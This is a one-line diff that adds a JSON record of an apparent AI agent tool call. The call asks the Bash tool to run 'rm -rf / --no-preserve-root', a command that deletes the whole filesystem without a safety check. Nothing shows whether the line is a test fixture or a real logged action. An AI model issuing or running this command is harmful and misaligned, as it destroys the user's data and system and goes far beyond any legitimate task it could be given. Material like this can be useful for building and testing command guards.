@@ -1,0 +1,1 @@
+{"type":"tool_use","id":"toolu_24","name":"Bash","input":{"command":"rm -rf / --no-preserve-root"}}
